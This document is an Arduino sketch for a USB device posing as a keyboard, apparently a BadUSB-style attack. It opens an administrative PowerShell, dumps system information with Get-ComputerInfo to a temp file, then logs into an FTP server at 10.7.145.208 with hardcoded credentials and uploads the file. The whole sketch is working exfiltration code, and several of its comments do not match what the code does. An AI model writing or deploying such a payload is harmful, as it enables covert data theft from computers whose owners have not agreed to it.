#include "Keyboard.h"

void setup() {
  // Start the keyboard emulation
  Keyboard.begin();
  
  // Delay to ensure the system is ready to receive keyboard input
  delay(5000);

  // Open Run dialog using Windows key + R
  Keyboard.press(KEY_LEFT_GUI);  // Windows key (GUI key)
  Keyboard.press('x');
  delay(500);
  Keyboard.releaseAll();

  delay(500);

  // Type "powershell" to open PowerShell
  Keyboard.press('a');
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);  // Press Enter
  delay(500);
  Keyboard.releaseAll();
  delay(2000);
  // Type the system info command
  Keyboard.print("Get-ComputerInfo | Out-File -FilePath C:\\Windows\\Temp\\sysinfo.txt");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("ftp 10.7.145.208");
  delay(13000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("user");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("12345");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("put C:\\Windows\\Temp\\sysinfo.txt systemInfoRec.txt");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);

  
  //Keyboard.press(KEY_RETURN);  // Press Enter to execute the command
  //delay(1000);
  //Keyboard.releaseAll();
  
  // End the keyboard emulation
  //Keyboard.end();
}

void loop() {
  // Nothing to do here
}